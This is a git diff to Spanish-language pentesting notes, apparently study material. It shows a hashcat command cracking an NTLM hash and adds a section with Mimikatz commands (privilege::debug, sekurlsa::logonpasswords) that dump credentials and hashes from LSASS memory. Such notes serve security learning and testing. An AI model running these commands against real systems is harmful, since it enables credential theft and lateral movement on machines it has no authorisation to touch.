@@ -75,3 +75,16 @@ Ejemplo de crack hash NTLM, aunque dependiendo lo que encontremos quizás hagamo
 ```bash
 sudo hashcat -m 1000 64f12cddaa88057e06a81b54e73b949b /usr/share/wordlists/rockyou.txt
 ```
+
+## Extracción credenciales y hashes LSASS en Memoria con Mimikatz
+```powershell
+
+./mimikatz.exe
+
+// 1. Solicitar privilegios de depuración para poder interactuar con LSASS
+privilege::debug
+
+// 2. Extraer las credenciales de las sesiones activas
+sekurlsa::logonpasswords
+
+```
